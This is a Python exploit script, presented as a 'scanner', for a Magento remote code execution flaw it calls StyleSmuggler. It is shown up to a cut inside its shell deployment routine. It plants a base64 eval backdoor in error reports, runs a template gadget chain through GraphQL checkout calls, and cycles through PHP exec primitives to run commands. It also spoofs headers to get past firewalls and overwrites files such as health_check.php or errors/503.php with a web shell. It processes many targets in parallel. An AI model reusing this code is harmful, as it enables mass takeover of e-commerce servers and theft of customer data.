#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-75650 StyleSmuggler - Standalone Scanner
No external dependencies except requests
"""

import os
import sys
import base64
import secrets
import urllib3
import requests
import re
import time
import http.client
import ssl
import json
import urllib.parse
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Force stop on CTRL+C
def signal_handler(sig, frame):
    print(f"\n\n{R}[!]{RST} CTRL+C detected - Force stopping immediately...")
    os._exit(1)

signal.signal(signal.SIGINT, signal_handler)

# Colors
R,G,Y,B,M,C,W,RST = "\033[91m","\033[92m","\033[93m","\033[94m","\033[95m","\033[96m","\033[97m","\033[0m"

# Global thread lock for safe printing
print_lock = threading.Lock()

BANNER = f"""{C}
███████╗████████╗██╗   ██╗██╗     ███████╗███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗ 
██╔════╝╚══██╔══╝╚██╗ ██╔╝██║     ██╔════╝██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
███████╗   ██║    ╚████╔╝ ██║     █████╗  ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
╚════██║   ██║     ╚██╔╝  ██║     ██╔══╝  ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
███████║   ██║      ██║   ███████╗███████╗███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
{RST}                               {Y}VENI{RST} | {G}VIDI{RST} | {R}VICI{RST}
"""

# Config
THREADS = 20          # outer: targets in parallel (max 50)
PATH_WORKERS = 3      # inner: path attempts per target in parallel
VERBOSE = True
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
OUTPUT_DIR = f"Result_{timestamp}"

# Thread-safe print
def safe_print(msg):
    """Thread-safe printing"""
    with print_lock:
        print(msg, flush=True)

# Extension bypass list - from SessionReaper (50+ extensions)
BYPASS_EXTENSIONS = [
    # PRIORITY: Trailing dots (PROVEN to work!)
    '.php.', '.phar.', '.phtml.', '.php5.', '.php4.', '.php3.', '.shtml.',
    # Double trailing dots
    '.php..', '.phar..', '.phtml..',
    # Trailing spaces
    '.php ', '.phar ', '.phtml ',
    # Standard PHP extensions
    '.php', '.phar', '.php5', '.php4', '.php3', '.phtml', '.pht', '.shtml',
    # Case sensitivity bypass
    '.pHp', '.pHP5', '.phAr', '.PhAr', '.PHAR', '.Php', '.PHP', '.PhTml',
    # Null byte injection (truncates at %00)
    '.php%00.jpg', '.phar%00.txt', '.php%00.png', '.php5%00.jpg', '.phtml%00.gif',
    # Double extensions
    '.jpg.php', '.png.php', '.txt.php', '.pdf.phar', '.gif.php', '.jpeg.php5', '.txt.phtml',
    # Alternative extensions
    '.inc', '.inc.', '.module', '.pgif',
]

# ==================== FILE WRITE & EXEC FALLBACK CHAINS ====================
def write_file_with_fallback(target, path, filename, content):
    """
    Try all 5 file write methods until one succeeds.
    FRESH poison + FRESH cart for EACH attempt!
    Returns: (success:bool, method_used:str|None)
    """
    methods = [
        ("file_put_contents", f"file_put_contents(getcwd().chr(47).'{filename}','{content}');"),
        ("fopen/fwrite", f"$h=fopen(getcwd().chr(47).'{filename}','w');fwrite($h,'{content}');fclose($h);"),
        ("SplFileObject", f"$o=new SplFileObject(getcwd().chr(47).'{filename}','w');$o->fwrite('{content}');"),
        ("fprintf", f"$h=fopen(getcwd().chr(47).'{filename}','w');fprintf($h,'%s','{content}');fclose($h);"),
        ("copy_data", f"copy('data://text/plain,{content}',getcwd().chr(47).'{filename}');"),
    ]
    
    for method_name, payload_php in methods:
        try:
            # FRESH POISON for this attempt
            report_id = poison(target)
            if not report_id:
                continue
            
            # FRESH CART for this attempt
            cart_id = create_cart(target)
            if not cart_id:
                continue
            
            set_email(target, cart_id)
            billing_result = set_billing(target, cart_id)
            if not billing_result:
                continue
            
            # Execute payload
            payload_b64 = base64.b64encode(payload_php.encode()).decode()
            trigger_stage2(target, cart_id, f"{path}/{report_id}", payload_b64)
            time.sleep(1)
            
            # Verify file was written
            check_url = f"{target}/{filename}"
            r = requests.get(check_url, headers=get_bypass_headers(), timeout=5, verify=False)
            if r.status_code == 200 and content in r.text:
                return True, method_name
        except:
            continue
    
    return False, None

def exec_command_with_fallback(target, path, command):
    """
    Try all 6 exec primitives until one returns output.
    FRESH poison + FRESH cart for EACH attempt!
    Returns: (success:bool, output:str, primitive_used:str|None)
    """
    primitives = [
        ("shell_exec", f"$_o=shell_exec('{command}');echo '_START_'.$_o.'_END_';"),
        ("exec", f"exec('{command}',$_a);$_o=implode(chr(10),$_a);echo '_START_'.$_o.'_END_';"),
        ("system", f"ob_start();system('{command}');$_o=ob_get_clean();echo '_START_'.$_o.'_END_';"),
        ("passthru", f"ob_start();passthru('{command}');$_o=ob_get_clean();echo '_START_'.$_o.'_END_';"),
        ("popen", f"$h=popen('{command}','r');$_o='';while(!feof($h))$_o.=fread($h,4096);pclose($h);echo '_START_'.$_o.'_END_';"),
        ("proc_open", f"$h=proc_open('{command}',array(1=>array('pipe','w')),$p);$_o=stream_get_contents($p[1]);proc_close($h);echo '_START_'.$_o.'_END_';"),
    ]
    
    for prim_name, payload_php in primitives:
        try:
            # FRESH POISON for this attempt
            report_id = poison(target)
            if not report_id:
                continue
            
            # FRESH CART for this attempt
            cart_id = create_cart(target)
            if not cart_id:
                continue
            
            set_email(target, cart_id)
            billing_result = set_billing(target, cart_id)
            if not billing_result:
                continue
            
            # Execute payload
            payload_b64 = base64.b64encode(payload_php.encode()).decode()
            result = trigger_stage2(target, cart_id, f"{path}/{report_id}", payload_b64)
            raw = result.get('raw', '')
            
            # Check for output markers
            if '_START_' in raw and '_END_' in raw:
                output = raw.split('_START_')[1].split('_END_')[0]
                if output.strip():
                    return True, output, prim_name
        except:
            continue
    
    return False, '', None

# ==================== WAF BYPASS & GITHUB DOWNLOAD ====================
def get_bypass_headers():
    """403/WAF bypass headers - Cloudflare, ModSecurity, AWS WAF, Nginx"""
    return {
        'X-Forwarded-For': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'Forwarded': 'for=127.0.0.1;by=127.0.0.1;host=127.0.0.1',
        'X-Original-URL': '/',
        'X-Rewrite-URL': '/',
        'X-Custom-IP-Authorization': '127.0.0.1',
        'X-ProxyUser-IP': '127.0.0.1',
        'True-Client-IP': '127.0.0.1',
        # Cloudflare-specific (for 520 errors)
        'CF-Connecting-IP': '127.0.0.1',
        'CF-IPCountry': 'US',
        'CF-RAY': '0',
        'CF-Visitor': '{"scheme":"https"}',
        'X-Forwarded-Proto': 'https',
        'Referer': 'https://www.google.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }

def download_from_github(url, description="file"):
    """Download from GitHub with wget/curl fallback"""
    print(f"{Y}[*]{RST} Downloading {description} from GitHub...")
    
    # Try requests first
    try:
        resp = requests.get(url, timeout=15, verify=False)
        if resp.status_code == 200:
            print(f"{G}[+]{RST} Downloaded via requests ({len(resp.text)} bytes)")
            return resp.text
    except Exception as e:
        print(f"{Y}[!]{RST} requests failed: {e}")
    
    # Try wget
    print(f"{Y}[*]{RST} Trying wget...")
    try:
        import subprocess
        result = subprocess.run(
            ['wget', '-q', '-O', '-', url],
            capture_output=True,
            timeout=15,
            text=True
        )
        if result.returncode == 0 and result.stdout:
            print(f"{G}[+]{RST} Downloaded via wget ({len(result.stdout)} bytes)")
            return result.stdout
    except Exception as e:
        print(f"{Y}[!]{RST} wget failed: {e}")
    
    # Try curl as final fallback
    print(f"{Y}[*]{RST} Trying curl...")
    try:
        import subprocess
        result = subprocess.run(
            ['curl', '-s', '-L', url],
            capture_output=True,
            timeout=15,
            text=True
        )
        if result.returncode == 0 and result.stdout:
            print(f"{G}[+]{RST} Downloaded via curl ({len(result.stdout)} bytes)")
            return result.stdout
    except Exception as e:
        print(f"{Y}[!]{RST} curl failed: {e}")
    
    print(f"{R}[!]{RST} All download methods failed!")
    return None

# ==================== HTTP HELPER FUNCTIONS ====================
def target_url(target: str, relative_path: str) -> urllib.parse.SplitResult:
    base = target.rstrip("/") + "/"
    return urllib.parse.urlsplit(urllib.parse.urljoin(base, relative_path.lstrip("/")))


def open_connection(
    destination: urllib.parse.SplitResult,
    timeout: int,
    proxy: str | None,
    proxy_insecure: bool,
) -> tuple[http.client.HTTPConnection, bool]:
    """Open a direct connection or an HTTP-proxy connection."""
    if destination.scheme not in {"http", "https"}:
        raise ValueError(f"unsupported target scheme: {destination.scheme!r}")

    if not proxy:
        if destination.scheme == "https":
            context = ssl.create_default_context()
            if proxy_insecure:
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
            return (
                http.client.HTTPSConnection(
                    destination.hostname,
                    destination.port or 443,
                    timeout=timeout,
                    context=context,
                ),
                False,
            )
        return (
            http.client.HTTPConnection(
                destination.hostname,
                destination.port or 80,
                timeout=timeout,
            ),
            False,
        )

    proxy_url = proxy if "://" in proxy else "http://" + proxy
    proxy_parts = urllib.parse.urlsplit(proxy_url)
    if proxy_parts.scheme != "http" or not proxy_parts.hostname:
        raise ValueError("--proxy must be an HTTP proxy such as http://127.0.0.1:8082")

    if destination.scheme == "https":
        context = ssl.create_default_context()
        if proxy_insecure:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        connection = http.client.HTTPSConnection(
            proxy_parts.hostname,
            proxy_parts.port or 8080,
            timeout=timeout,
            context=context,
        )
        connection.set_tunnel(destination.hostname, destination.port or 443)
        return connection, False

    return (
        http.client.HTTPConnection(
            proxy_parts.hostname,
            proxy_parts.port or 8080,
            timeout=timeout,
        ),
        True,
    )


def request(
    target: str,
    method: str,
    relative_path: str,
    *,
    body: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: int = 30,
    proxy: str | None = None,
    proxy_insecure: bool = False,
    raw_request_target: bool = False,
) -> tuple[int, str]:
    destination = target_url(target, relative_path)
    connection, absolute_form = open_connection(destination, timeout, proxy, proxy_insecure)
    path = destination.path or "/"
    if destination.query:
        path += "?" + destination.query
    request_target = urllib.parse.urlunsplit(destination) if absolute_form else path

    request_headers = {"Host": destination.netloc, "Accept": "*/*"}
    request_headers.update(headers or {})
    if raw_request_target:
        connection.putrequest(method, request_target, skip_host=True)
        for name, value in request_headers.items():
            connection.putheader(name, value)
        if body is not None and "Content-Length" not in request_headers:
            connection.putheader("Content-Length", str(len(body)))
        connection.endheaders(body)
    else:
        connection.request(method, request_target, body=body, headers=request_headers)

    response = connection.getresponse()
    response_body = response.read().decode("utf-8", "replace")
    status = response.status
    connection.close()
    return status, response_body

# ==================== CORE EXPLOIT FUNCTIONS ====================
PREVIEW_BLOCK = "{{block class=Magento\\Email\\Block\\Adminhtml\\Template\\Preview}}"
NESTED_BILLING_VALUE = "{{if postcode}}{{var postcode}}{{/if}}{{/var}}{{if postcode}}{{var postcode}}{{/if}}{{if city}}" + PREVIEW_BLOCK + "{{/if}}"
STAGE2_TEMPLATE_TEXT = "{{block class=Magento\\Backend\\Block\\Widget\\Grid\\ColumnSet rowUrl=$this.template_styles}}"
ARRAY_SCANNER = "Magento\\Setup\\Module\\Di\\Code\\Scanner\\ArrayScanner"

CREATE_CART = "mutation CreateGuestCart { createEmptyCart }"

SET_EMAIL = """
mutation SetGuestEmail($cartId: String!, $email: String!) {
  setGuestEmailOnCart(input: {cart_id: $cartId, email: $email}) {
    cart { id email }
  }
}
"""

SET_BILLING = """
mutation SetBillingAddress($cartId: String!, $address: CartAddressInput!) {
  setBillingAddressOnCart(input: {
    cart_id: $cartId,
    billing_address: {address: $address, use_for_shipping: false}
  }) {
    cart { id billing_address { firstname lastname company street city postcode } }
  }
}
"""

FAILED_PAYMENT = """
mutation TriggerFailedPayment($cartId: String!, $payload: String!) {
  handlePayflowProResponse(
    input: {cart_id: $cartId, paypal_payload: $payload}
  ) {
    cart { id }
  }
}
"""

def graphql(target, query, variables=None, bypass=False):
    """Execute GraphQL query - minimal headers by default (matching reference PoCs).
    Set bypass=True only when explicitly needed (e.g. WAF-protected trigger paths)."""
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    if bypass:
        headers.update(get_bypass_headers())
    
    body = json.dumps({"query": query, "variables": variables or {}}).encode()
    status, raw = request(target, "POST", "/graphql", body=body, headers=headers, timeout=30, proxy=None, proxy_insecure=False)
    
    if status != 200:
        raise RuntimeError(f"POST /graphql returned HTTP {status}: {raw[:500]}")
    try:
        decoded = json.loads(raw)
    except Exception as e:
        raise RuntimeError(f"POST /graphql returned invalid JSON: {raw[:500]}") from e
    if not isinstance(decoded, dict):
        raise RuntimeError(f"POST /graphql returned unexpected JSON value")
    return decoded

def poison(target):
    """Stage 1: Poison report with URL encoding bypass and retry"""
    # Poison payload variants (try URL encoding to bypass WAF signatures)
    POISON_VARIANTS = [
        "<?=eval(base64_decode($_GET[0]))?>",  # Original
        "%3C%3F%3Deval%28base64_decode%28%24_GET%5B0%5D%29%29%3F%3E",  # URL encoded
        "<%3Feval(base64_decode($_GET[0]))%3F>",  # Partial encode
    ]
    
    for attempt, payload in enumerate(POISON_VARIANTS, 1):
        try:
            # Add random parameter to force new report + timestamp
            random_param = f"&r={int(time.time())}_{secrets.token_hex(6)}"
            path = f"/paypal/transparent/response/?{payload}{random_param}"
            
            # Use bypass headers on poison request too!
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                **get_bypass_headers()
            }
            
            status, response_body = request(
                target,
                "POST",
                path,
                body=b"RESULT=12&RESPMSG=Declined",
                headers=headers,
                timeout=30,
                proxy=None,
                proxy_insecure=False,
                raw_request_target=True
            )
            
            if VERBOSE and attempt == 1:
                print(f"[*] stage 1: POST /paypal/transparent/response/?<?=eval... -> HTTP {status}")
            
            # Magento only writes error reports on 5xx (server errors).
            # 404/301/200 pages may contain hex strings that are NOT real report IDs.
            # Accepting them causes false paths and wastes all trigger attempts.
            if status not in range(500, 600):
                if attempt < len(POISON_VARIANTS):
                    time.sleep(0.5)
                    continue
                break  # No 5xx on any variant — endpoint not vulnerable

            # Use the specific regex that matches Magento's "Error log record number:" label
            # (same as dinosn reference PoC - avoids false matches on session tokens / hashes)
            match = (
                re.search(r"Error log record number:\s*([a-f0-9]{64})", response_body, re.I)
                or re.search(r"([0-9a-f]{64})", response_body)
            )
            if match:
                report_id = match.group(1)
                if VERBOSE:
                    if attempt > 1:
                        print(f"[*] stage 1: Success with variant {attempt} (URL encoded)")
                    print(f"[*] stage 1: Magento disclosed report id {report_id}")
                return report_id
            
            # If no report ID found, try next variant
            if attempt < len(POISON_VARIANTS):
                time.sleep(0.5)  # Brief delay between attempts
                continue
        
        except Exception as e:
            if attempt < len(POISON_VARIANTS):
                time.sleep(1)  # Longer delay on error
                continue
            raise
    
    # All variants failed
    if VERBOSE:
        print(response_body[:800])
    raise RuntimeError("stage 1 failed: no report id found in the error page")

def create_cart(target):
    """Create guest cart"""
    result = graphql(target, CREATE_CART)
    cart_id = result.get("data", {}).get("createEmptyCart")
    if not cart_id or not isinstance(cart_id, str) or len(cart_id) < 8:
        raise RuntimeError(f"createEmptyCart returned invalid cart id: {result}")
    if VERBOSE and cart_id:
        print(f"[*] stage 2 request 1: created guest cart {cart_id}")
    return cart_id

def set_email(target, cart_id):
    """Set guest email"""
    result = graphql(target, SET_EMAIL, {"cartId": cart_id, "email": "test@example.com"})
    if result.get("errors"):
        raise RuntimeError(f"setGuestEmailOnCart failed: {result}")
    if VERBOSE:
        print(f"[*] stage 2 request 2: set the guest email")

def get_available_countries(target):
    """Query GraphQL for available countries"""
    try:
        query = "query {countries {id full_name_locale}}"
        result = graphql(target, query)
        countries = result.get("data", {}).get("countries", [])
        country_list = [c["id"] for c in countries if c.get("id")]
        return country_list if country_list else ["AD", "GB", "DE", "NL", "FR"]
    except:
        return ["AD", "GB", "DE", "NL", "FR"]

def set_billing(target, cart_id):
    """Set billing address - try ALL available countries until one works
    EXACT copy of style-poc-random.py set_nested_billing_address logic"""
    # Query countries first
    available_countries = get_available_countries(target)
    if VERBOSE:
        print(f"[*] stage 2 request 3: detected {len(available_countries)} available countries")
    
    # Try multiple country codes - sites have different configs
    for country_code in available_countries:
        address = {
            "firstname": "A",
            "lastname": "B",
            "company": NESTED_BILLING_VALUE,
            "street": ["1 Bridge Street"],
            "city": "x",
            "postcode": "{{var postcode}}" if country_code != "US" else "12345",
            "country_code": country_code,
            "telephone": "0",
        }
        try:
            response = graphql(target, SET_BILLING, {"cartId": cart_id, "address": address})
            # Validate response has data.setBillingAddressOnCart
            if response.get("data", {}).get("setBillingAddressOnCart"):
                if VERBOSE:
                    print(f"[*] stage 2 request 3: stored the nested billing-address bridge (country: {country_code})")
                return True  # Success!
        except Exception as e:
            if "Country" in str(e) or "countryId" in str(e):
                if country_code != available_countries[-1]:
                    continue  # Try next country
            raise  # Re-raise if it's another error or last country failed
    
    # All countries failed
    raise RuntimeError(f"setBillingAddressOnCart failed for all {len(available_countries)} countries")

def trigger_stage2(target, cart_id, report_path, payload_b64):
    """Trigger gadget chain - uses request() helper"""
    params = [
        ("type", "2"), ("text", STAGE2_TEMPLATE_TEXT),
        ("styles[first]", report_path),
        ("styles[generatorClass]", "Aws\\S3\\S3Client"),
        ("styles[version]", "latest"), ("styles[region]", "us-east-1"),
        ("styles[with_resolved][0][instance]", ARRAY_SCANNER),
        ("styles[with_resolved][0][_i_]", ARRAY_SCANNER),
        ("styles[with_resolved][1]", "collectEntities"),
        ("0", payload_b64)
    ]
    
    if VERBOSE:
        print(f"{C}[DEBUG]{RST} cart_id: {cart_id}")
    
    endpoint = "/graphql?" + urllib.parse.urlencode(params)
    body = json.dumps({
        "query": FAILED_PAYMENT,
        "variables": {"cartId": cart_id, "payload": "RESULT=12&RESPMSG=Declined"}
    }).encode()
    
    # DON'T use bypass headers for stage2 - use minimal headers like style-poc-random.py
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    
    status, raw = request(target, "POST", endpoint, body=body, headers=headers, timeout=120, proxy=None, proxy_insecure=False)
    
    if VERBOSE:
        if raw and not raw.startswith('{'):
            print(f"[*] stage 2 request 4: response contains output from the included report")
        else:
            print(f"[*] stage 2 request 4: Magento returned 'Transaction has been declined'")
        if len(raw) > 0:
            print(f"[*] stage 2 request 4: raw response preview (first 500 chars):")
            print(f"{Y}{raw[:500]}{RST}")
    
    return {"raw": raw, "status": status}

def trigger_stage2_with_retry(target, cart_id, report_path, payload_b64, max_attempts=3):
    """Trigger with retry for 520/transient errors"""
    for attempt in range(max_attempts):
        try:
            result = trigger_stage2(target, cart_id, report_path, payload_b64)
            status = result.get('status', 0)
            
            # Retry on 520 (Cloudflare), 503 (temp unavailable), or connection errors
            if status in [520, 503] and attempt < max_attempts - 1:
                wait_time = 2 ** attempt  # Exponential backoff: 1s, 2s, 4s
                if VERBOSE:
                    print(f"[*] stage 2 request 4: Got {status}, retrying in {wait_time}s (attempt {attempt+1}/{max_attempts})...")
                time.sleep(wait_time)
                continue
            
            return result
        
        except Exception as e:
            if attempt < max_attempts - 1:
                wait_time = 2 ** attempt
                if VERBOSE:
                    print(f"[*] stage 2 request 4: Error {str(e)[:50]}, retrying in {wait_time}s...")
                time.sleep(wait_time)
                continue
            raise
    
    return {"raw": "", "status": 520}


# ==================== PATH DISCOVERY ====================
def try_path_disclosure(target):
    """Try CVE-based path discovery with WAF bypass"""
    try:
        headers = get_bypass_headers()
        for endpoint in ['/maintenance.flag', '/nonexistent', '/admin/test']:
            resp = requests.get(f"{target}{endpoint}", headers=headers, timeout=5, verify=False)
            if '/var/www/' in resp.text or '/home/' in resp.text:
                match = re.search(r'(/(?:var/www|home)/[a-zA-Z0-9_\-/]+)/(?:pub|app)', resp.text)
                if match:
                    return match.group(1) + '/var/report'
    except:
        pass
    return None

def get_paths(domain):
    """Generate comprehensive path list - nginx, Apache, cPanel, Magento patterns"""
    parsed = urllib.parse.urlparse(domain if '://' in domain else f'http://{domain}')
    hostname = parsed.hostname or domain
    
    disclosed = try_path_disclosure(domain)
    
    # Extract potential usernames from domain
    users = []
    parts = hostname.split('.')
    if len(parts) > 2:
        users.append(parts[0])  # subdomain
    users.append(parts[-2] if len(parts) >= 2 else parts[0])  # domain name
    users.extend(['magento', 'magento2', 'shop', 'web', 'store', 'ecommerce'])
    
    paths = [disclosed] if disclosed else []
    
    # Common Apache/LAMP paths
    paths.extend([
        "/var/www/html/var/report",
        "/var/www/magento/var/report",
        "/var/www/magento2/var/report",
        "/var/www/vhosts/default/var/report",
    ])
    
    # Nginx paths
    paths.extend([
        "/usr/share/nginx/html/var/report",
        "/usr/share/nginx/html/magento/var/report",
        "/usr/share/nginx/html/magento2/var/report",
        f"/usr/share/nginx/html/{hostname}/var/report",
        f"/usr/share/nginx/html/{parts[-2] if len(parts) >= 2 else hostname}/var/report",
    ])
    
    # cPanel/DirectAdmin patterns
    for u in users[:5]:
        paths.extend([
            f"/home/{u}/public_html/var/report",
            f"/home/{u}/domains/{hostname}/public_html/var/report",
            f"/home/{u}/www/var/report",
            f"/home/{u}/htdocs/var/report",
            f"/home/{u}/{hostname}/public_html/var/report",
        ])
    
    # Plesk patterns
    paths.extend([
        f"/var/www/vhosts/{hostname}/httpdocs/var/report",
        f"/var/www/vhosts/{hostname}/public_html/var/report",
    ])
    
    # Docker/Cloud patterns
    paths.extend([
        "/app/var/report",
        "/application/var/report",
        "/opt/magento/var/report",
        "/opt/magento2/var/report",
    ])
    
    # Remove duplicates while preserving order
    seen = set()
    unique_paths = []
    for p in paths:
        if p and p not in seen:
            seen.add(p)
            unique_paths.append(p)
    
    return unique_paths

def test_path(target, cart_id, report_id, path):
    """Test if the poisoned report file is actually INCLUDED by checking for canary in response"""
    try:
        import random, string
        
        # Generate unique canary that will be in the report file
        canary = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        # Payload just echoes the canary - proving the report file was included
        payload = base64.b64encode(f"echo '{canary}';".encode()).decode()
        
        result = trigger_stage2(target, cart_id, f"{path}/{report_id}", payload)
        raw = result.get('raw', '')
        
        # Filter known error patterns
        if any(x in raw.lower() for x in ['403 forbidden', '404 not found', '502 bad gateway', '网站防火墙', 'access denied', 'cloudflare']):
            return False
        
        # Check if canary appears in response - proving report was included and executed
        return canary in raw
    except:
        return False

# ==================== SERVER DETECTION + SHELL DEPLOYMENT ====================
# Nginx Magento whitelist: location ~ ^/(index|get|static|errors/report|errors/404|errors/503|health_check)\.php$
# Apache: .htaccess per-directory overrides work → create random_dir/.htaccess + shell.php
NGINX_WHITELIST = [
    "health_check.php",
    "get.php",
    "static.php",
    "errors/report.php",
    "errors/404.php",
    "errors/503.php",
]

def detect_server(target):
    """Detect server type from response headers. Returns 'nginx', 'apache', 'litespeed', or 'unknown'."""
    try:
        r = requests.get(target, timeout=8, verify=False)
        srv = r.headers.get('Server', '').lower()
        if 'nginx' in srv:
            return 'nginx'
        elif 'apache' in srv or 'httpd' in srv:
            return 'apache'
        elif 'litespeed' in srv or 'lsws' in srv:
            return 'litespeed'  # LiteSpeed also respects .htaccess
    except:
        pass
    return 'unknown'

def build_nginx_payload(shell_b64, token, result_file='ss_deploy_result.txt'):
    """
    ONE payload that loops through all Nginx-whitelisted filenames in PHP.
    Backs up originals, writes shell, reports which file was used.
    """
    filelist = '|'.join(NGINX_WHITELIST)
    return (
        f"$tok='{token}';"
        f"$files=explode('|','{filelist}');"
        "$ok=false;"
        "foreach($files as $rel){"
            "$d=dirname($rel)!='.'?dirname($rel):'';"
            "$abs=getcwd().chr(47).str_replace(chr(47).chr(47),chr(47),str_replace('/',chr(47),$rel));"
            "$adir=$d?getcwd().chr(47).str_replace('/',chr(47),$d):getcwd();"
            "if($d&&!is_dir($adir)){@mkdir($adir,0755,true);}"
            "$bak=file_exists($abs)?file_get_contents($abs):'';"
            f"$sh=base64_decode('{shell_b64}');"
            "$w=@file_put_contents($abs,$sh);"
            "if($w!==false){"
                "@file_put_contents($abs.'.bak',$bak);"
                f"file_put_contents(getcwd().chr(47).'{result_file}',$tok.chr(10).'[SERVER] nginx'.chr(10).'[SHELL] '.$rel.chr(10));"
                "$ok=true;break;"
            "}"
        "}"
        f"if(!$ok){{file_put_contents(getcwd().chr(47).'{result_file}',$tok.chr(10).'[SERVER] nginx'.chr(10).'[SHELL] NONE_WRITABLE'.chr(10));}}"
    )

def build_apache_payload(shell_b64, token, result_file='ss_deploy_result.txt'):
    """
    Creates a random subdir in getcwd() with:
      - .htaccess enabling PHP execution
      - shell.php
    Works on Apache/LiteSpeed where per-dir .htaccess is respected.
    """
    rand = secrets.token_hex(5)
    dirname = f"x_{rand}"
    shellname = f"s_{rand}.php"
    htaccess = (
        "Options+ExecCGI'.chr(10).'AddHandler application/x-httpd-php .php"
        "'.chr(10).'AddType application/x-httpd-php .php"
        "'.chr(10).'<FilesMatch \\\\.php$>'.chr(10).'SetHandler application/x-httpd-php'.chr(10).'</FilesMatch>"
    )
    return (
        f"$tok='{token}';"
        f"$dir=getcwd().chr(47).'{dirname}';"
        "@mkdir($dir,0755,true);"
        f"file_put_contents($dir.chr(47).'.htaccess','Options+ExecCGI'.chr(10).'AddHandler application/x-httpd-php .php'.chr(10).'AddType application/x-httpd-php .php'.chr(10).'<FilesMatch \\\\.php$>'.chr(10).'SetHandler application/x-httpd-php'.chr(10).'</FilesMatch>');"
        f"$sh=base64_decode('{shell_b64}');"
        f"file_put_contents($dir.chr(47).'{shellname}',$sh);"
        f"file_put_contents(getcwd().chr(47).'{result_file}',$tok.chr(10).'[SERVER] apache'.chr(10).'[SHELL] {dirname}/{shellname}'.chr(10));"
    )

def deploy_shell(target, rpath, shell_code, server_type=None):
    """
    3-step cascade shell deployment (all server types).
    Each step gets its OWN fresh poison + cart + billing to avoid cartId=0 errors.

      Step 1 → health_check.php / get.php  (Nginx whitelist)
      Step 2 → errors/503.php              (Nginx whitelisted + Apache/LS universal)
      Step 3 → random_dir/ + .htaccess     (Apache / LiteSpeed only)

    Each step verified with verify_shell_exec() before moving on.
    Returns (shell_url, shell_rel) or (None, None).
    """
    shell_b64 = base64.b64encode(shell_code.encode()).decode()

    if server_type is None:
        server_type = detect_server(target)
    if VERBOSE:
        safe_print(f"{C}[*]{RST} Server: {server_type.upper()}")

    def fresh_trigger(php_payload):
        """Get fresh poison+cart+billing, then trigger stage2. Returns True on HTTP 200."""
        rid = poison(target)
        if not rid:
            return False
        cid = create_cart(target)
        if not cid:
            return False
        set_email(target, cid)
        if not set_billing(target, cid):
            return False
        p64 = base64.b64encode((php_payload.rstrip() + ";").encode()).decode()
        result = trigger_stage2(target, cid, f"{rpath}/{rid}", p64)
        time.sleep(1.5)
        return result.get('status') in (200, 500)

    def try_url(url):
        try:
            r = requests.get(url, headers=get_bypass_headers(), timeout=6, verify=False)
            return r.status_code == 200, r.text
        except:
            return False, ""

    # ── STEP 1: health_check.php / get.php ──────────────────────────
    if VERBOSE:
        safe_print(f"{Y}[STEP 1]{RST} health_check.php / get.php")
    for rel in ["health_check.php", "get.php"]:
        payload = (
            f"$sh=base64_decode('{shell_b64}');"
            f"$bak=@file_get_contents(getcwd().chr(47).'{rel}');"
            f"$w=@file_put_contents(getcwd().chr(47).'{rel}',$sh);"
            f"if($w!==false&&$bak){{@file_put_contents(getcwd().chr(47).'{rel}.bak',$bak);}}"
        )
        fresh_trigger(payload)
        for base_url in [target, f"{target}/pub"]:
            shell_url = f"{base_url}/{rel}"
            ok, body = try_url(shell_url)
            if ok and '<?php' not in body[:80]:
                verified, out = verify_shell_exec(shell_url)
                if verified:
                    if VERBOSE:
                        safe_print(f"{G}[STEP 1 ✓]{RST} {shell_url} | {out[:80]}")
                    return shell_url, rel

    # ── STEP 2: errors/503.php ───────────────────────────────────────
    if VERBOSE:
        safe_print(f"{Y}[STEP 2]{RST} errors/503.php")
    payload = (
        "@mkdir(getcwd().chr(47).'errors',0755,true);"
        f"$sh=base64_decode('{shell_b64}');"
        "$bak=@file_get_contents(getcwd().chr(47).'errors'.chr(47).'503.php');"
        "$w=@file_put_contents(getcwd().chr(47).'errors'.chr(47).'503.php',$sh);"
        "if($w!==false&&$bak){@file_put_contents(getcwd().chr(47).'errors'.chr(47).'503.php.bak',$bak);}"
    )
    fresh_trigger(payload)
    for base_url in [target, f"{target}/pub"]:
        shell_url = f"{base_url}/errors/503.php"
        ok, body = try_url(shell_url)
        if ok and '<?php' not in body[:80]:
            verified, out = verify_shell_exec(shell_url)
            if verified:
                if VERBOSE:
                    safe_print(f"{G}[STEP 2 ✓]{RST} {shell_url} | {out[:80]}")
                return shell_url, "errors/503.php"

    # ── STEP 3: Random dir + .htaccess (Apache/LiteSpeed) ───────────
    if VERBOSE:
        safe_print(f"{Y}[STEP 3]{RST} Random dir + .htaccess")
    rand      = secrets.token_hex(5)
    dirname   = f"x_{rand}"
    shellname = f"s_{rand}.php"
    shell_rel = f"{dirname}/{shellname}"
    payload = (
        f"$d=getcwd().chr(47).'{dirname}';"
        "@mkdir($d,0755,true);"
